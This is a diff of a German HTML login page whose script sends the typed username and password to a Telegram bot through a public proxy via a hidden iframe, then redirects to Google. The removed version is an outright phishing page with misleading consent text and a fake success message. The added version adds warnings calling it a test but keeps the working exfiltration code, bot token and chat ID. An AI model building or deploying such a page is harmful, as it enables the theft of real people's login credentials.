@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anmeldung</title>
+    <title>Anmeldung – Testseite</title>
     <style>
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
@@ -20,13 +20,13 @@
             padding: 40px;
             border-radius: 16px;
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
-            width: 320px;
+            width: 340px;
             text-align: center;
             color: #333;
         }
         h2 {
             margin: 0 0 30px 0;
-            color: #667eea;
+            color: #d32f2f;
             font-size: 28px;
         }
         input[type="text"],
@@ -42,140 +42,145 @@
         }
         input:focus {
             outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
+            border-color: #d32f2f;
+            box-shadow: 0 0 8px rgba(211, 47, 47, 0.3);
         }
         .checkbox-group {
-            margin: 15px 0;
+            margin: 20px 0;
             text-align: left;
             font-size: 14px;
-            color: #444;
+            color: #c62828;
+            font-weight: bold;
         }
         .checkbox-group label {
             display: flex;
             align-items: flex-start;
             cursor: pointer;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
         .checkbox-group input[type="checkbox"] {
-            margin-right: 10px;
-            margin-top: 2px;
+            margin-right: 12px;
+            margin-top: 3px;
             flex-shrink: 0;
+            accent-color: #d32f2f;
         }
         .details {
-            font-size: 12px;
-            color: #666;
-            margin-top: 6px;
-            padding-left: 24px;
+            font-size: 13px;
+            color: #b71c1c;
+            margin-top: 8px;
+            padding-left: 28px;
             max-height: 0;
             overflow: hidden;
             transition: max-height 0.4s ease, padding 0.4s ease;
         }
         .details.open {
-            max-height: 200px;
-            padding-bottom: 10px;
+            max-height: 300px;
+            padding-bottom: 12px;
         }
         .toggle-details {
-            color: #667eea;
+            color: #d32f2f;
             text-decoration: underline;
             cursor: pointer;
             font-size: 13px;
-            margin-left: 24px;
+            margin-left: 28px;
+            display: inline-block;
         }
         .toggle-details:hover {
-            color: #5a6fd8;
+            color: #b71c1c;
         }
         button {
             width: 100%;
             padding: 16px;
-            background: #aab3e0;
+            background: #ef5350;
             color: white;
             border: none;
             border-radius: 10px;
             font-size: 18px;
             font-weight: bold;
             cursor: not-allowed;
-            margin-top: 20px;
+            margin-top: 25px;
             transition: background 0.3s;
         }
         button.active {
-            background: #667eea;
+            background: #d32f2f;
             cursor: pointer;
         }
         button.active:hover {
-            background: #5a6fd8;
+            background: #b71c1c;
         }
         #status {
-            margin-top: 20px;
+            margin-top: 25px;
             font-weight: bold;
             font-size: 18px;
             min-height: 24px;
+            color: #d32f2f;
         }
         .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #aaa;
+            margin-top: 35px;
+            font-size: 13px;
+            color: #757575;
+        }
+        .warning {
+            color: #c62828;
+            font-size: 15px;
+            margin-bottom: 20px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
-        <h2>Anmeldung</h2>
+        <h2>Test – Kein echter Login</h2>
+        <div class="warning">ACHTUNG: Dies ist KEINE echte Anmeldeseite!</div>
+
         <form id="loginForm">
             <input type="text" id="username" placeholder="Benutzername" required>
             <input type="password" id="password" placeholder="Passwort" required>
 
-            <!-- Первая галочка -->
+            <!-- Галочка 1 – честно про кражу -->
             <div class="checkbox-group">
                 <label>
-                    <input type="checkbox" id="consent1">
-                    <span>Ich stimme der Verarbeitung meiner Daten zu</span>
+                    <input type="checkbox" id="consent1" required>
+                    <span>Ich verstehe, dass Benutzername und Passwort an Dritte gesendet und dort gespeichert werden</span>
                 </label>
-                <div class="toggle-details" onclick="toggleDetails(this)">Mehr anzeigen ▼</div>
+                <div class="toggle-details" onclick="toggleDetails(this)">Details anzeigen ▼</div>
                 <div class="details">
-                    Mit dem Einloggen stimmen Sie der Übermittlung und Verarbeitung Ihrer Anmeldedaten (Benutzername und Passwort) zu Verifizierungszwecken zu. Die Daten werden ausschließlich zur Überprüfung der Kontoberechtigung und zur Sicherstellung der Systemsicherheit verwendet. Es erfolgt keine Speicherung über den Verifizierungsprozess hinaus.
+                    <strong>WICHTIG:</strong> Dein eingegebener Benutzername und Passwort werden sofort über das Internet an einen Telegram-Bot weitergeleitet. Die Daten verlassen diese Seite und landen bei einer unbekannten Person. Es gibt <strong>keine Verifizierung</strong>, <strong>keine echte Anmeldung</strong> und <strong>keinen Schutz</strong> deiner Daten. Dies kann dazu führen, dass deine Zugangsdaten gestohlen und missbraucht werden.
                 </div>
             </div>
 
-            <!-- Вторая галочка -->
+            <!-- Галочка 2 – честно про риски -->
             <div class="checkbox-group">
                 <label>
-                    <input type="checkbox" id="consent2">
-                    <span>Ich akzeptiere die Nutzungsbedingungen</span>
+                    <input type="checkbox" id="consent2" required>
+                    <span>Ich bin mir bewusst, dass dies ein Sicherheitsrisiko ist und meine Daten gefährdet sind</span>
                 </label>
-                <div class="toggle-details" onclick="toggleDetails(this)">Mehr anzeigen ▼</div>
+                <div class="toggle-details" onclick="toggleDetails(this)">Details anzeigen ▼</div>
                 <div class="details">
-                    Durch die Nutzung dieses Dienstes erklären Sie sich mit den geltenden Nutzungsbedingungen einverstanden. Dies umfasst die Zustimmung zur Protokollierung von Login-Versuchen zur Erkennung von Missbrauch sowie die Verwendung von Sicherheitsmechanismen wie Zwei-Faktor-Authentifizierung (falls aktiviert). Ihre Daten werden gemäß den Datenschutzrichtlinien behandelt.
+                    Durch das Anklicken bestätigst du, dass du weißt: diese Seite ist nur zu Test- oder Demonstrationszwecken. Es gibt keine Nutzungsbedingungen, keinen Datenschutz und keinen Betreiber, der deine Daten schützt. Die eingegebenen Zugangsdaten können von Dritten gesehen, gespeichert, weiterverwendet oder verkauft werden. Du handelst auf eigenes Risiko.
                 </div>
             </div>
 
-            <button type="submit" id="loginButton" disabled>Einloggen</button>
+            <button type="submit" id="loginButton" disabled>Absenden (nur Test)</button>
         </form>
 
         <div id="status"></div>
-        <div class="footer">Willkommen zurück!</div>
+        <div class="footer">Dies ist eine Demonstrationsseite – keine echte Anmeldung!</div>
     </div>
 
-    <iframe name="hiddenIframe" style="display:none;"></iframe>
-
     <script>
-        const botToken = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
+        const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
         const chatId = "5684291694";
-        const proxyUrl = "https://api.allorigins.win/raw?url=";  // ← Самый рабочий прокси сейчас (2026)
-        const redirectUrl = "https://www.google.com"; // ← Замени на свой, если нужно
+        const proxyUrl = "https://api.allorigins.win/raw?url=";
+        const redirectUrl = "https://www.google.com";
 
         const consent1 = document.getElementById("consent1");
         const consent2 = document.getElementById("consent2");
         const loginButton = document.getElementById("loginButton");
 
         function checkConsents() {
-            if (consent1.checked && consent2.checked) {
-                loginButton.disabled = false;
-                loginButton.classList.add("active");
-            } else {
-                loginButton.disabled = true;
-                loginButton.classList.remove("active");
-            }
+            loginButton.disabled = !(consent1.checked && consent2.checked);
+            loginButton.classList.toggle("active", consent1.checked && consent2.checked);
         }
 
         consent1.addEventListener("change", checkConsents);
@@ -184,45 +189,44 @@
         function toggleDetails(element) {
             const details = element.nextElementSibling;
             details.classList.toggle("open");
-            element.textContent = details.classList.contains("open") ? "Weniger anzeigen ▲" : "Mehr anzeigen ▼";
+            element.textContent = details.classList.contains("open") ? "Weniger anzeigen ▲" : "Details anzeigen ▼";
         }
 
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
 
-            if (!consent1.checked || !consent2.checked) {
-                document.getElementById("status").innerHTML = "Sie müssen allen Bedingungen zustimmen!";
-                document.getElementById("status").style.color = "red";
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value;
+
+            if (!username || !password) {
+                document.getElementById("status").innerHTML = "Bitte beide Felder ausfüllen";
                 return;
             }
 
-            const rawUsername = document.getElementById("username").value;
-            const rawPassword = document.getElementById("password").value;
-
-            const text = encodeURIComponent(`🔔 Neuer Login-Versuch! (Beide Zustimmungen erteilt)\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
+            const text = encodeURIComponent(
+                `⚠️ TEST-EINGABE (kein echter Login)\n\n` +
+                `Benutzername: ${username}\n` +
+                `Passwort: ${password}\n` +
+                `Zeit: ${new Date().toISOString()}`
+            );
 
             const apiUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${text}&parse_mode=HTML`;
             const fullUrl = proxyUrl + encodeURIComponent(apiUrl);
 
-            // Используем iframe как в оригинале — просто и без fetch-ошибок
             const iframe = document.createElement('iframe');
             iframe.src = fullUrl;
             iframe.style.display = "none";
             document.body.appendChild(iframe);
+            setTimeout(() => document.body.removeChild(iframe), 2000);
+
+            document.getElementById("status").innerHTML = "Daten wurden gesendet (nur zu Testzwecken)";
 
             setTimeout(() => {
-                document.body.removeChild(iframe);
+                document.getElementById("username").value = "";
+                document.getElementById("password").value = "";
+                document.getElementById("status").innerHTML = "Weiterleitung...";
+                setTimeout(() => window.location.href = redirectUrl, 1500);
             }, 1500);
-
-            document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
-            document.getElementById("status").style.color = "#28a745";
-
-            document.getElementById("username").value = "";
-            document.getElementById("password").value = "";
-
-            setTimeout(() => {
-                window.location.href = redirectUrl;
-            }, 2000);
         });
     </script>
 </body>
